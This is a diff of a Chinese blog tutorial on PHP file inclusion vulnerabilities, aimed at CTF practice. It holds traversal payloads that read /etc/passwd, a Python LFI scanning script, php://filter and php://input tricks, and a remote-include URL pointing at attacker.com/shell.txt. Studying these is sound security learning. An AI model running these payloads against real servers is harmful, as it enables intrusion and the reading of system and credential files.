@@ -20,12 +20,12 @@
   <title>PHP文件包含漏洞 - 无言の小屋</title>
 
   
-    <meta name="description" content="PHP文件包含漏洞基础知识概述和SQL注入等攻击方式一样，文件包含漏洞也是一种注入型漏洞，其本质就是输入一段用户能够控制的脚本或者代码，并让服务端执行 “包含”：以PHP为例，我们常常把可重复使用的函数写入到单个文件中，在使用该函数时，直接调用此文件，而无需再次编写函数，这一过程叫做包含 攻击者可以通过修改文件的位置来让后台执行任意文件，从而导致文件包含漏洞 相关函数include， requir">
+    <meta name="description" content="PHP文件包含漏洞  基础知识  概述 和SQL注入等攻击方式一样，文件包含漏洞也是一种注入型漏洞，其本质就是输入一段用户能够控制的脚本或者代码，并让服务端执行 “包含”：以PHP为例，我们常常把可重复使用的函数写入到单个文件中，在使用该函数时，直接调用此文件，而无需再次编写函数，这一过程叫做包含 攻击者可以通过修改文件的位置来让后台执行任意文件，从而导致文件包含漏洞  相关函数 include">
 <meta property="og:type" content="article">
 <meta property="og:title" content="PHP文件包含漏洞">
 <meta property="og:url" content="https://ikunmma.github.io/2025/07/09/PHP%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/index.html">
 <meta property="og:site_name" content="无言の小屋">
-<meta property="og:description" content="PHP文件包含漏洞基础知识概述和SQL注入等攻击方式一样，文件包含漏洞也是一种注入型漏洞，其本质就是输入一段用户能够控制的脚本或者代码，并让服务端执行 “包含”：以PHP为例，我们常常把可重复使用的函数写入到单个文件中，在使用该函数时，直接调用此文件，而无需再次编写函数，这一过程叫做包含 攻击者可以通过修改文件的位置来让后台执行任意文件，从而导致文件包含漏洞 相关函数include， requir">
+<meta property="og:description" content="PHP文件包含漏洞  基础知识  概述 和SQL注入等攻击方式一样，文件包含漏洞也是一种注入型漏洞，其本质就是输入一段用户能够控制的脚本或者代码，并让服务端执行 “包含”：以PHP为例，我们常常把可重复使用的函数写入到单个文件中，在使用该函数时，直接调用此文件，而无需再次编写函数，这一过程叫做包含 攻击者可以通过修改文件的位置来让后台执行任意文件，从而导致文件包含漏洞  相关函数 include">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2025-07-09T03:46:32.097Z">
 <meta property="article:modified_time" content="2025-05-18T01:36:39.666Z">
@@ -69,7 +69,7 @@
 <div class="widgets">
 
 
-<widget class="widget-wrapper post-list"><div class="widget-header dis-select"><span class="name">最近更新</span></div><div class="widget-body fs14"><a class="item title" href="/2025/07/09/MySQL%20handler%E7%9A%84%E7%94%A8%E6%B3%95%E4%B8%8E%E5%BA%94%E7%94%A8/"><span class="title">MySQL</span></a><a class="item title" href="/2025/07/09/Flask%E4%B8%AD%E7%9A%84Jinja2%E7%AE%80%E5%8D%95%E7%94%A8%E6%B3%95/"><span class="title">SSTI漏洞</span></a><a class="item title" href="/2025/07/09/Python%20SSTI%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/"><span class="title">SSTI漏洞</span></a><a class="item title" href="/2025/07/09/C++%E4%B8%AD%E7%9A%84%E6%8B%B7%E8%B4%9D%E6%9E%84%E9%80%A0%E5%87%BD%E6%95%B0%E3%80%81%E6%B5%85%E6%8B%B7%E8%B4%9D%E4%B8%8E%E6%B7%B1%E6%8B%B7%E8%B4%9D/"><span class="title">C++</span></a><a class="item title" href="/2025/07/09/%5Bflask%5DSSTI%201/"><span class="title">“Buuctf [flask]SSTI”</span></a><a class="item title" href="/2025/07/09/%5BSUCTF-2019%5DEasySQL/"><span class="title">“[SUCTF 2019]EasySQL”</span></a><a class="item title" href="/2025/07/09/%5B%E5%BC%BA%E7%BD%91%E6%9D%AF-2019%5D%E9%9A%8F%E4%BE%BF%E6%B3%A8/"><span class="title">“[强网杯 2019]随便注”</span></a><a class="item title" href="/2025/07/09/C++%E4%B8%AD%E7%9A%84%E8%BD%AC%E6%8D%A2%E6%9E%84%E9%80%A0%E5%87%BD%E6%95%B0%E4%B8%8E%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2%E8%BF%90%E7%AE%97%E7%AC%A6/"><span class="title">C++</span></a><a class="item title" href="/2025/07/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"><span class="title">文件上传漏洞</span></a><a class="item title" href="/2025/07/09/PHP%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"><span class="title">PHP文件包含漏洞</span></a></div></widget>
+<widget class="widget-wrapper post-list"><div class="widget-header dis-select"><span class="name">最近更新</span></div><div class="widget-body fs14"><a class="item title" href="/2025/07/09/C++%E4%B8%AD%E7%9A%84%E8%BD%AC%E6%8D%A2%E6%9E%84%E9%80%A0%E5%87%BD%E6%95%B0%E4%B8%8E%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2%E8%BF%90%E7%AE%97%E7%AC%A6/"><span class="title">C++中的转换构造函数与类型转换运算符</span></a><a class="item title" href="/2025/07/09/C++%E4%B8%AD%E7%9A%84%E6%8B%B7%E8%B4%9D%E6%9E%84%E9%80%A0%E5%87%BD%E6%95%B0%E3%80%81%E6%B5%85%E6%8B%B7%E8%B4%9D%E4%B8%8E%E6%B7%B1%E6%8B%B7%E8%B4%9D/"><span class="title">C++中的拷贝构造函数、浅拷贝与深拷贝</span></a><a class="item title" href="/2025/07/09/Flask%E4%B8%AD%E7%9A%84Jinja2%E7%AE%80%E5%8D%95%E7%94%A8%E6%B3%95/"><span class="title">Flask中的Jinja2简单用法</span></a><a class="item title" href="/2025/07/09/Python%20SSTI%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/"><span class="title">Python SSTI漏洞简单利用</span></a><a class="item title" href="/2025/07/09/Python%20SSTI%E5%9F%BA%E7%A1%80%E7%BB%95%E8%BF%87/"><span class="title">Python SSTI基础绕过</span></a><a class="item title" href="/2025/07/09/MySQL%20handler%E7%9A%84%E7%94%A8%E6%B3%95%E4%B8%8E%E5%BA%94%E7%94%A8/"><span class="title">MySQL</span></a><a class="item title" href="/2025/07/09/%5Bflask%5DSSTI%201/"><span class="title">“Buuctf [flask]SSTI”</span></a><a class="item title" href="/2025/07/09/%5BSUCTF-2019%5DEasySQL/"><span class="title">“[SUCTF 2019]EasySQL”</span></a><a class="item title" href="/2025/07/09/%5B%E5%BC%BA%E7%BD%91%E6%9D%AF-2019%5D%E9%9A%8F%E4%BE%BF%E6%B3%A8/"><span class="title">“[强网杯 2019]随便注”</span></a><a class="item title" href="/2025/07/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"><span class="title">文件上传漏洞</span></a></div></widget>
 </div>
 
 </div></aside><div class="l_main" id="main">
@@ -93,81 +93,108 @@
     </div>
     
   </div>
-  </div><article class="md-text content"><h1 id="PHP文件包含漏洞"><a href="#PHP文件包含漏洞" class="headerlink" title="PHP文件包含漏洞"></a>PHP文件包含漏洞</h1><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>和SQL注入等攻击方式一样，文件包含漏洞也是一种<strong>注入型漏洞</strong>，其本质就是输入一段用户能够控制的脚本或者代码，并让服务端执行</p>
+  </div><article class="md-text content"><h1 id="php文件包含漏洞"><a class="markdownIt-Anchor" href="#php文件包含漏洞"></a> PHP文件包含漏洞</h1>
+<h2 id="基础知识"><a class="markdownIt-Anchor" href="#基础知识"></a> 基础知识</h2>
+<h3 id="概述"><a class="markdownIt-Anchor" href="#概述"></a> 概述</h3>
+<p>和SQL注入等攻击方式一样，文件包含漏洞也是一种<strong>注入型漏洞</strong>，其本质就是输入一段用户能够控制的脚本或者代码，并让服务端执行</p>
 <p>“包含”：以PHP为例，我们常常把可重复使用的函数写入到单个文件中，在使用该函数时，直接调用此文件，而无需再次编写函数，这一过程叫做包含</p>
 <p>攻击者可以通过修改文件的位置来让后台执行任意文件，从而导致文件包含漏洞</p>
-<h3 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h3><p>include， require<br>require报错会终止程序，但是include会继续执行下面代码。</p>
-<p>include_once ，require_once<br>包含过的就不会继续包含</p>
-<h2 id="漏洞类型"><a href="#漏洞类型" class="headerlink" title="漏洞类型"></a>漏洞类型</h2><h3 id="LFI-Local-File-Inclusion"><a href="#LFI-Local-File-Inclusion" class="headerlink" title="LFI(Local File Inclusion)"></a>LFI(Local File Inclusion)</h3><p>本地文件包含漏洞，指的是能打开并包含本地文件的漏洞。大部分情况下遇到的文件包含漏洞都是LFI</p>
-<h3 id="RFI-Remote-File-Inclusion"><a href="#RFI-Remote-File-Inclusion" class="headerlink" title="RFI(Remote File Inclusion)"></a>RFI(Remote File Inclusion)</h3><p>远程文件包含漏洞，指能够包含远程服务器上的文件并执行。由于远程服务器的文件是我们可控的，因此漏洞一旦存在危害性会很大</p>
+<h3 id="相关函数"><a class="markdownIt-Anchor" href="#相关函数"></a> 相关函数</h3>
+<p>include， require<br />
+require报错会终止程序，但是include会继续执行下面代码。</p>
+<p>include_once ，require_once<br />
+包含过的就不会继续包含</p>
+<h2 id="漏洞类型"><a class="markdownIt-Anchor" href="#漏洞类型"></a> 漏洞类型</h2>
+<h3 id="lfilocal-file-inclusion"><a class="markdownIt-Anchor" href="#lfilocal-file-inclusion"></a> LFI(Local File Inclusion)</h3>
+<p>本地文件包含漏洞，指的是能打开并包含本地文件的漏洞。大部分情况下遇到的文件包含漏洞都是LFI</p>
+<h3 id="rfiremote-file-inclusion"><a class="markdownIt-Anchor" href="#rfiremote-file-inclusion"></a> RFI(Remote File Inclusion)</h3>
+<p>远程文件包含漏洞，指能够包含远程服务器上的文件并执行。由于远程服务器的文件是我们可控的，因此漏洞一旦存在危害性会很大</p>
 <p>RFI对<code>php.ini</code>里的配置有些要求：</p>
-<p><code>allow_url_fopen = On</code><br><code>allow_url_include = On</code></p>
+<p><code>allow_url_fopen = On</code><br />
+<code>allow_url_include = On</code></p>
 <p><code>allow_url_fopen</code> 允许 PHP 读取远程文件</p>
 <p><code>allow_url_include</code> 则允许 PHP 在代码中包含远程文件</p>
 <p>注：在<code>php.ini</code>中，<code>allow_url_fopen</code>默认一直是On，而<code>allow_url_include</code>从php5.2之后就默认为Off</p>
-<h4 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h4><p>如果目标服务器配置允许远程文件包含（<code>allow_url_include=On</code>），可以尝试包含远程文件，例如：</p>
+<h4 id="测试"><a class="markdownIt-Anchor" href="#测试"></a> 测试</h4>
+<p>如果目标服务器配置允许远程文件包含（<code>allow_url_include=On</code>），可以尝试包含远程文件，例如：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">http://example.com/index.php?page=http://attacker.com/shell.txt<br></code></pre></td></tr></table></figure>
-
 <p>如果服务器加载了远程文件的内容，说明存在远程文件包含漏洞</p>
-<h2 id="用-etc-passwd来检验漏洞存在"><a href="#用-etc-passwd来检验漏洞存在" class="headerlink" title="用/etc/passwd来检验漏洞存在"></a>用<code>/etc/passwd</code>来检验漏洞存在</h2><p>常见的测试文件包括：</p>
+<h2 id="用etcpasswd来检验漏洞存在"><a class="markdownIt-Anchor" href="#用etcpasswd来检验漏洞存在"></a> 用<code>/etc/passwd</code>来检验漏洞存在</h2>
+<p>常见的测试文件包括：</p>
 <ul>
 <li><code>/etc/passwd</code>（Linux系统用户信息）</li>
 <li><code>/etc/hosts</code>（主机名配置）</li>
 <li><code>/proc/self/environ</code>（环境变量）</li>
-<li>Apache&#x2F;Nginx日志文件（如<code>/var/log/apache2/access.log</code>）</li>
+<li>Apache/Nginx日志文件（如<code>/var/log/apache2/access.log</code>）</li>
 </ul>
 <p><code>/etc/passwd</code> 文件包含 <code>root:</code> 关键字，如果返回 <code>root:x:0:0:</code> 说明读取成功</p>
-<h3 id="路径遍历"><a href="#路径遍历" class="headerlink" title="路径遍历"></a>路径遍历</h3><p><code>http://target.com/index.php?file=../../../../../../etc/passwd</code></p>
+<h3 id="路径遍历"><a class="markdownIt-Anchor" href="#路径遍历"></a> 路径遍历</h3>
+<p><code>http://target.com/index.php?file=../../../../../../etc/passwd</code></p>
 <p>也可用python脚本</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">import requests<br><br># 目标 URL<br>url = &quot;http://target.com/index.php?file=&quot;<br><br># 常见的 LFI 路径遍历<br>payloads = [<br>    &quot;../../../../../../etc/passwd&quot;,<br>    &quot;..//..//..//..//..//..//etc/passwd&quot;,  # 双斜杠绕过<br>    &quot;....//....//....//....//etc/passwd&quot;,  # 多点斜杠绕过<br>]<br><br># 发送请求<br>for payload in payloads:<br>    full_url = url + payload<br>    response = requests.get(full_url)<br><br>    if &quot;root:x:0:0:&quot; in response.text:<br>        print(f&quot;[+] 成功！LFI 存在: &#123;full_url&#125;&quot;)<br>        print(response.text[:200])  # 仅显示部分内容<br>        break<br>    else:<br>        print(f&quot;[-] 失败: &#123;full_url&#125;&quot;)<br><br></code></pre></td></tr></table></figure>
-
-<h3 id="利用-php-filter-进行-Base64-编码"><a href="#利用-php-filter-进行-Base64-编码" class="headerlink" title="利用 php://filter 进行 Base64 编码"></a>利用 <code>php://filter</code> 进行 Base64 编码</h3><p><code>http://target.com/index.php?file=php://filter/convert.base64-encode/resource=/etc/passwd</code></p>
-<h3 id="Null-Byte-截断（PHP"><a href="#Null-Byte-截断（PHP" class="headerlink" title="Null Byte 截断（PHP &lt;5.3.4）"></a><code>Null Byte</code> 截断（PHP &lt;5.3.4）</h3><p>如果服务器强制 <code>.php</code> 后缀：</p>
+<h3 id="利用-phpfilter-进行-base64-编码"><a class="markdownIt-Anchor" href="#利用-phpfilter-进行-base64-编码"></a> 利用 <code>php://filter</code> 进行 Base64 编码</h3>
+<p><code>http://target.com/index.php?file=php://filter/convert.base64-encode/resource=/etc/passwd</code></p>
+<h3 id="null-byte-截断php-534"><a class="markdownIt-Anchor" href="#null-byte-截断php-534"></a> <code>Null Byte</code> 截断（PHP &lt;5.3.4）</h3>
+<p>如果服务器强制 <code>.php</code> 后缀：</p>
 <p><code>http://target.com/index.php?file=../../../../../etc/passwd%00</code></p>
-<h3 id="PATH-INFO-截断"><a href="#PATH-INFO-截断" class="headerlink" title="PATH_INFO 截断"></a><strong><code>PATH_INFO</code> 截断</strong></h3><p><code>http://target.com/index.php?file=../../../../../../etc/passwd....................</code></p>
-<h2 id="包含方法"><a href="#包含方法" class="headerlink" title="包含方法"></a>包含方法</h2><h3 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">1 file:// — 访问本地文件系统<br>2 http:// — 访问 HTTP(s) 网址<br>3 ftp:// — 访问 FTP(s) URLs<br>4 php:// — 访问各个输入/输出流(I/O streams)<br>5 zlib:// — 压缩流<br>6 data:// — 数据(RFC 2397)<br>7 glob:// — 查找匹配的文件路径模式<br>8 phar:// — PHP 归档<br>9 ssh2:// — Secure Shell 2<br>10 rar:// — RAR<br>11 ogg:// — 音频流<br>12 expect:// — 处理交互式的流<br></code></pre></td></tr></table></figure>
-
-<h4 id="file"><a href="#file" class="headerlink" title="file:&#x2F;&#x2F;"></a>file:&#x2F;&#x2F;</h4><p>访问本地文件系统，若不加协议名称，<strong>默认封装协议</strong>为<code>file://</code>协议</p>
-<h5 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h5><ul>
+<h3 id="path_info-截断"><a class="markdownIt-Anchor" href="#path_info-截断"></a> <strong><code>PATH_INFO</code> 截断</strong></h3>
+<p><code>http://target.com/index.php?file=../../../../../../etc/passwd....................</code></p>
+<h2 id="包含方法"><a class="markdownIt-Anchor" href="#包含方法"></a> 包含方法</h2>
+<h3 id="php伪协议"><a class="markdownIt-Anchor" href="#php伪协议"></a> php伪协议</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">1 file:// — 访问本地文件系统<br>2 http:// — 访问 HTTP(s) 网址<br>3 ftp:// — 访问 FTP(s) URLs<br>4 php:// — 访问各个输入/输出流(I/O streams)<br>5 zlib:// — 压缩流<br>6 data:// — 数据(RFC 2397)<br>7 glob:// — 查找匹配的文件路径模式<br>8 phar:// — PHP 归档<br>9 ssh2:// — Secure Shell 2<br>10 rar:// — RAR<br>11 ogg:// — 音频流<br>12 expect:// — 处理交互式的流<br></code></pre></td></tr></table></figure>
+<h4 id="file"><a class="markdownIt-Anchor" href="#file"></a> file://</h4>
+<p>访问本地文件系统，若不加协议名称，<strong>默认封装协议</strong>为<code>file://</code>协议</p>
+<h5 id="条件"><a class="markdownIt-Anchor" href="#条件"></a> 条件</h5>
+<ul>
 <li><code>allow_url_fopen:off/on</code></li>
 <li><code>allow_url_include :off/on</code></li>
 </ul>
-<h5 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h5><p>用于访问本地文件系统（服务器中的文件）</p>
+<h5 id="作用"><a class="markdownIt-Anchor" href="#作用"></a> 作用</h5>
+<p>用于访问本地文件系统（服务器中的文件）</p>
 <p>在CTF中通常用来读取本地文件的且不受<code>allow_url_fopen</code>与<code>allow_url_include</code>的影响</p>
 <p>注：使用file协议时无法使用相对路径</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">cmd=file://flag #用法错误，声明file协议时无法使用相对路径<br>cmd=file:///flag #用法正确，使用绝对路径<br>cmd=/flag #用法正确，使用绝对路径<br>cmd=flag #用法正确，使用相对路径<br></code></pre></td></tr></table></figure>
-
-<h5 id="使用实例"><a href="#使用实例" class="headerlink" title="使用实例"></a>使用实例</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#Linux<br>cmd=file:///path/to/flag #根目录下path文件夹中to文件夹下flag文件 ——此处有///三条<br>cmd=/path/to/flag #根目录下path文件夹中to文件夹下flag文件<br>cmd=relative/path/flag #当前目录下relative文件夹中path文件夹下flag文件<br>cmd=flag #当前目录下的flag文件<br><br>#Windows<br>cmd=file://C:/path/to/flag #C盘中path文件夹中to文件夹下flag文件<br>cmd=file://C:\path\to\flag #C盘中path文件夹中to文件夹下flag文件<br>cmd=C:\path\to\flag #C盘中path文件夹中to文件夹下flag文件<br>cmd=flag  #当前文件夹下flag文件<br></code></pre></td></tr></table></figure>
-
-<h4 id="http"><a href="#http" class="headerlink" title="http:&#x2F;&#x2F;"></a>http:&#x2F;&#x2F;</h4><p>访问 HTTP(s) 网址</p>
-<h5 id="条件-1"><a href="#条件-1" class="headerlink" title="条件"></a>条件</h5><ul>
+<h5 id="使用实例"><a class="markdownIt-Anchor" href="#使用实例"></a> 使用实例</h5>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#Linux<br>cmd=file:///path/to/flag #根目录下path文件夹中to文件夹下flag文件 ——此处有///三条<br>cmd=/path/to/flag #根目录下path文件夹中to文件夹下flag文件<br>cmd=relative/path/flag #当前目录下relative文件夹中path文件夹下flag文件<br>cmd=flag #当前目录下的flag文件<br><br>#Windows<br>cmd=file://C:/path/to/flag #C盘中path文件夹中to文件夹下flag文件<br>cmd=file://C:\path\to\flag #C盘中path文件夹中to文件夹下flag文件<br>cmd=C:\path\to\flag #C盘中path文件夹中to文件夹下flag文件<br>cmd=flag  #当前文件夹下flag文件<br></code></pre></td></tr></table></figure>
+<h4 id="http"><a class="markdownIt-Anchor" href="#http"></a> http://</h4>
+<p>访问 HTTP(s) 网址</p>
+<h5 id="条件-2"><a class="markdownIt-Anchor" href="#条件-2"></a> 条件</h5>
+<ul>
 <li>allow_url_fopen:on</li>
 <li>allow_url_include:on</li>
 </ul>
-<h5 id="作用-1"><a href="#作用-1" class="headerlink" title="作用"></a>作用</h5><p>常规 URL 形式，允许通过 HTTP 1.0 的 GET方法，以只读访问文件或资源。CTF中通常用于<strong>远程包含</strong></p>
-<h5 id="使用实例-1"><a href="#使用实例-1" class="headerlink" title="使用实例"></a>使用实例</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">cmd=http://example.com/phpinfo.txt    #读取http://example.com/phpinfo.txt文件<br>cmd=https://example.com/file.php?var1=val1&amp;var2=val2    #读取https://example.com/file.php文件并且传入var1和var2的值<br></code></pre></td></tr></table></figure>
-
-<h4 id="php"><a href="#php" class="headerlink" title="php:&#x2F;&#x2F;"></a>php:&#x2F;&#x2F;</h4><p>访问各个输入&#x2F;输出流(I&#x2F;O streams)，伪协议提供了多种不同的方式来访问和处理数据</p>
-<h5 id="常见"><a href="#常见" class="headerlink" title="常见"></a>常见</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">php://input #这个伪协议用于访问HTTP请求的原始主体数据。它通常用于从POST请求中读取数据。<br>php://output #这个伪协议用于访问HTTP响应的输出流。它通常用于向客户端发送数据。<br>php://stdin #用于访问标准输入流。<br>php://stdout #用于访问标准输出流。<br>php://stderr #用于访问标准错误输出流。<br>php://temp #用于临时存储数据的内存流。它可以用于在没有创建实际文件的情况下处理临时数据。<br>php://memory #用于在内存中创建可读写的数据流。<br>php://filter #这个伪协议用于数据过滤和转换。它允许您将不同的过滤器应用于数据流，例如Base64编码、压缩和加密等。<br>php://globals #用于访问全局变量。可以通过此伪协议查看和修改PHP全局变量的值。<br>php://fd #用于访问文件描述符。它允许您在PHP中访问底层文件系统。<br></code></pre></td></tr></table></figure>
-
+<h5 id="作用-2"><a class="markdownIt-Anchor" href="#作用-2"></a> 作用</h5>
+<p>常规 URL 形式，允许通过 HTTP 1.0 的 GET方法，以只读访问文件或资源。CTF中通常用于<strong>远程包含</strong></p>
+<h5 id="使用实例-2"><a class="markdownIt-Anchor" href="#使用实例-2"></a> 使用实例</h5>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">cmd=http://example.com/phpinfo.txt    #读取http://example.com/phpinfo.txt文件<br>cmd=https://example.com/file.php?var1=val1&amp;var2=val2    #读取https://example.com/file.php文件并且传入var1和var2的值<br></code></pre></td></tr></table></figure>
+<h4 id="php"><a class="markdownIt-Anchor" href="#php"></a> php://</h4>
+<p>访问各个输入/输出流(I/O streams)，伪协议提供了多种不同的方式来访问和处理数据</p>
+<h5 id="常见"><a class="markdownIt-Anchor" href="#常见"></a> 常见</h5>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">php://input #这个伪协议用于访问HTTP请求的原始主体数据。它通常用于从POST请求中读取数据。<br>php://output #这个伪协议用于访问HTTP响应的输出流。它通常用于向客户端发送数据。<br>php://stdin #用于访问标准输入流。<br>php://stdout #用于访问标准输出流。<br>php://stderr #用于访问标准错误输出流。<br>php://temp #用于临时存储数据的内存流。它可以用于在没有创建实际文件的情况下处理临时数据。<br>php://memory #用于在内存中创建可读写的数据流。<br>php://filter #这个伪协议用于数据过滤和转换。它允许您将不同的过滤器应用于数据流，例如Base64编码、压缩和加密等。<br>php://globals #用于访问全局变量。可以通过此伪协议查看和修改PHP全局变量的值。<br>php://fd #用于访问文件描述符。它允许您在PHP中访问底层文件系统。<br></code></pre></td></tr></table></figure>
 <p>在CTF中经常使用的是**<code>php://filter</code><strong>和</strong><code>php://input</code>**、<code>php://filter</code>用于读取源码，<code>php://input</code>用于执行POST参数中的php代码</p>
-<h5 id="条件-2"><a href="#条件-2" class="headerlink" title="条件"></a>条件</h5><ul>
+<h5 id="条件-3"><a class="markdownIt-Anchor" href="#条件-3"></a> 条件</h5>
+<ul>
 <li><code>allow_url_fopen:off/on</code></li>
 <li><code>allow_url_include</code> :仅<code>php://input</code> 、<code>php://stdin</code>、<code>php://memory</code>、<code>php://temp</code> 需要on</li>
 </ul>
-<h5 id="php-input"><a href="#php-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a>php:&#x2F;&#x2F;input</h5><h6 id="条件-3"><a href="#条件-3" class="headerlink" title="条件"></a>条件</h6><ul>
+<h5 id="phpinput"><a class="markdownIt-Anchor" href="#phpinput"></a> php://input</h5>
+<h6 id="条件-4"><a class="markdownIt-Anchor" href="#条件-4"></a> 条件</h6>
+<ul>
 <li><code>allow_url_fopen:off/on</code></li>
 <li><code>allow_url_include :on</code></li>
 </ul>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">GET[URL部分]<br>?file=php://input<br><br>POST[POST DATA部分]<br>&lt;? phpinfo();?&gt;<br></code></pre></td></tr></table></figure>
-
-<h6 id="作用-2"><a href="#作用-2" class="headerlink" title="作用"></a>作用</h6><p>主要用来接收<strong>post</strong>数据</p>
+<h6 id="作用-3"><a class="markdownIt-Anchor" href="#作用-3"></a> 作用</h6>
+<p>主要用来接收<strong>post</strong>数据</p>
 <p>CTF中文件包含题目里，可以使用<code>php://input</code>协议，将post请求中的数据作为php代码执行</p>
-<h5 id="php-filter"><a href="#php-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a>php:&#x2F;&#x2F;filter</h5><h6 id="条件-4"><a href="#条件-4" class="headerlink" title="条件"></a>条件</h6><ul>
+<h5 id="phpfilter"><a class="markdownIt-Anchor" href="#phpfilter"></a> php://filter</h5>
+<h6 id="条件-5"><a class="markdownIt-Anchor" href="#条件-5"></a> 条件</h6>
+<ul>
 <li><code>allow_url_fopen:off/on</code></li>
 <li><code>allow_url_include :off/on</code></li>
 </ul>
-<h6 id="作用-3"><a href="#作用-3" class="headerlink" title="作用"></a>作用</h6><p>可以作为一个位于原始数据流和最终目标之间的中间流来处理其他流，负责对数据进行处理（即读取或写入数据之前对其进行修改或过滤）</p>
+<h6 id="作用-4"><a class="markdownIt-Anchor" href="#作用-4"></a> 作用</h6>
+<p>可以作为一个位于原始数据流和最终目标之间的中间流来处理其他流，负责对数据进行处理（即读取或写入数据之前对其进行修改或过滤）</p>
 <table>
 <thead>
 <tr>
@@ -175,31 +202,34 @@
 <th>描述</th>
 </tr>
 </thead>
-<tbody><tr>
-<td>resource&#x3D;&lt;要过滤的数据流&gt;</td>
+<tbody>
+<tr>
+<td>resource=&lt;要过滤的数据流&gt;</td>
 <td>这个参数是必须的。它指定了你要筛选过滤的数据流。（<strong>加绝对路径</strong>）</td>
 </tr>
 <tr>
-<td>read&#x3D;&lt;读链的筛选列表&gt;</td>
+<td>read=&lt;读链的筛选列表&gt;</td>
 <td>read参数指定 一个或多个过滤器 用于<strong>读</strong>操作，可以设定一个或多个过滤器名称，以管道符分隔。（读取文件后编码输出）</td>
 </tr>
 <tr>
-<td>write&#x3D;&lt;写链的筛选列表&gt;</td>
+<td>write=&lt;写链的筛选列表&gt;</td>
 <td>write参数指定 一个或多个过滤器 用于<strong>写</strong>操作，可以设定一个或多个过滤器名称，以管道符分隔。（编码重写入文件）</td>
 </tr>
 <tr>
 <td>&lt;；两个链的筛选列表&gt;</td>
-<td>任何没有以 read&#x3D; 或 write&#x3D; 作前缀的筛选器列表<strong>会视情况应用于读或写链</strong>。</td>
